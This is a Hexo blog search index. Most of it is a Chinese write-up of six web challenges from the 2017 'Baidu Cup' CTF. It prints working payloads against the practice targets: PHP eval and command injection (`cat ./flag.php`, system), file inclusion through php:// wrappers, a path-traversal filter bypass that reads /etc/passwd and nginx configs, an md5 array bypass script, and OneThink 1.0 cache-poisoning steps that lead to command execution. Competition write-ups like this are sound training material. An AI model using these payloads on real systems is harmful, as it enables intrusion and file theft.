<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>“百度杯”CTF比赛 2017 二月场</title>
    <url>/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/</url>
    <content><![CDATA[<h3 id="“百度杯”CTF比赛-2017-二月场-Writeup"><a href="#“百度杯”CTF比赛-2017-二月场-Writeup" class="headerlink" title="“百度杯”CTF比赛 2017 二月场 Writeup"></a>“百度杯”CTF比赛 2017 二月场 Writeup</h3><h2 id="一-：-爆破-1"><a href="#一-：-爆破-1" class="headerlink" title="一 ： 爆破-1"></a>一 ： 爆破-1</h2><p>打开链接,看到php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>看到$$，应该是超全局变量</p>
<p>直接构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://abc741867e084776a3f60edf23a17e75edbd3a30f5cb4047.changame.ichunqiu.com/?hello=GLOBALS</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/1.jpg" alt></p>
<h2 id="二-爆破-2"><a href="#二-爆破-2" class="headerlink" title="二 :  爆破-2"></a>二 :  爆破-2</h2><p>打开链接，php代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到var_dump($a)，尝试用$GLOBALS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://828a5642d838412dbeb8e07676951034a06796aaaccc4bfb.changame.ichunqiu.com/?hello=$GLOBALS</span><br></pre></td></tr></table></figure>

<p>发现没有flag</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/2.jpg" alt></p>
<p>看提示说没在变量中</p>
<p>就尝试读取文件</p>
<p>两种方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?hello=file(&quot;flag.php&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?hello=);echo%20`cat%20./flag.php`;//</span><br></pre></td></tr></table></figure>

<p>用的第二种</p>
<p>eval语句就变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(&quot;var_dump();echo `cat ./flag.php`;//&quot;);</span><br></pre></td></tr></table></figure>

<p>F12查看源码,得到flag</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/3.jpg" alt></p>
<h2 id="三-爆破-3"><a href="#三-爆破-3" class="headerlink" title="三 :  爆破-3"></a>三 :  爆破-3</h2><p>打开看php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>每次都会$_SESSION[‘whoami’] = $str_rands;设置一个随机的值</p>
<p>substr(md5($value),5,4)==0比较md5加密后的值是否为0，可以把value变成数组可以绕过</p>
<blockquote>
<p>因为md5加密一个数组值为null，而null==0 </p>
</blockquote>
<p>通过爆破10次后就可以得到flag;可以写python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://1eff6bf7980b4fe580e8f34167ccaa79fc87bd91ab174f10.changame.ichunqiu.com/'</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">html=session.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+html[<span class="number">0</span>:<span class="number">2</span>]).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag&#123;.*&#125;'</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> (html)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/4.jpg" alt></p>
<h2 id="四-：include"><a href="#四-：include" class="headerlink" title="四 ：include"></a>四 ：include</h2><p>打开看到代码在左上角</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据提示是文件包含漏洞</p>
<p>就看phpinfo中的allow_url_include是否开启</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/5.jpg" alt></p>
<p>开启的，就可以用php伪协议 php://input进行包含</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/6.jpg" alt></p>
<p>用<?php echo system('ls') ?>列出目录</p>
<p>发现有个 dle345aae.php 文件，用php://filter读取文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?path=php://filter/read=convert.base64-encode/resource=dle345aae.php</span><br></pre></td></tr></table></figure>

<p>得到base64加密后的flag</p>
<p>解密得到flag</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/7.jpg" alt></p>
<h2 id="五-：-Zone"><a href="#五-：-Zone" class="headerlink" title="五 ： Zone"></a>五 ： Zone</h2><p>打开链接是一个登录框，尝试sql注入，没发现注入点。看源码也没发现线索</p>
<p>然后想到抓包分析，看到response包有个参数是 login=0</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/8.jpg" alt></p>
<p>然后把login改成1，登录成功，但是显示是乱码。</p>
<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/9.jpg" alt></p>
<p>看到url有点特殊</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.ph?module=ind../ex&amp;name=php</span><br></pre></td></tr></table></figure>

<p>返回正常，应该过滤了../</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.ph?module=ind.././ex&amp;name=php</span><br></pre></td></tr></table></figure>

<p>返回错误，没过滤./，所以可以构造…/./进行绕过过滤</p>
<p>测试文件读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.php?module=..././..././..././etc/passwd&amp;name=</span><br></pre></td></tr></table></figure>

<p>查看下服务器是nginx。找一下它的配置文件，在自己的kali下，用以下命令查找：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# find / -name &quot;nginx.conf&quot;</span><br></pre></td></tr></table></figure>

<p>，返回 /etc/nginx/nginx.conf</p>
<p>读取该配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.php?module=..././..././..././etc/nginx/nginx.conf&amp;name=</span><br></pre></td></tr></table></figure>

<p>返回中有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include sites-enabled/default</span><br></pre></td></tr></table></figure>

<p>继续读取该文件</p>
<p>在该文件里，发现 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location /online-movies &#123;</span><br><span class="line">            alias /movie/;</span><br><span class="line">            autoindex on;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这里边的 autoindex on  ，即为允许目录浏览。访问/online-movies ,发现页面上显示../即可浏览目录下载文件。访问/online-movies../var/www/html/flag.php    下载该文件，获得flag</p>
<h2 id="六-：-OneThink"><a href="#六-：-OneThink" class="headerlink" title="六 ： OneThink"></a>六 ： OneThink</h2><p>google OneThink 1.0的漏洞</p>
<p>参考大佬的<a href="https://ox1234.github.io/2018/07/27/OneThink%20CMS%E7%9A%84%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">博客</a></p>
<p>1、注册账号名为： %0aphpinfo();#  的账号   //  %0a是换行符的意思，缓存到文件的时候起换行作用</p>
<p>2、填写好注册信息进行抓包 ,  burp抓包的时候  把%0a 进行url解码1次  以换行了为准</p>
<p>3、注册完之后进行登陆，同样要抓包，把%0a进行url解码1次；</p>
<p>4、登陆成功之后，访问Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php路径文件，会发现phpinfo()被解析           //该文件地址及文件名是固定的；</p>
<p>5、同样的方法注册俩个账号： %0a$a=$_GET[a];//   和   %0asystem($a);//  </p>
<p>6、注册完之后，要登陆俩个账号  才能把账号名写入到文件当中</p>
<p>7、访问Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=cat ../../flag.php 获取flag    //通过ls  ../的方式翻目录进行flag寻找；最后cat的 flag在源码中会显示</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/11/24/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
